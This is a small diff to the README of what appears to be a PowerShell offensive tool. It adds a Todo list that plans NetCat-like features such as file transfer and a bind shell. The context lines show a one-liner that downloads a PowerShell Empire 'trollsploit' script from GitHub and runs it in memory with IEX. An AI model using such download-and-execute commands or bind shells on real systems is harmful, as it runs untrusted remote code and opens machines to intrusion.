@@ -36,3 +36,6 @@ Or
 ```
 C:\>PowerShell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/trollsploit/Get-RickAstley.ps1'); Get-RickAstley" 
 ```
+### Todo
+
+* Build more NetCat like functions within the code (File Transfers, Bind Shell, UDP Transport).
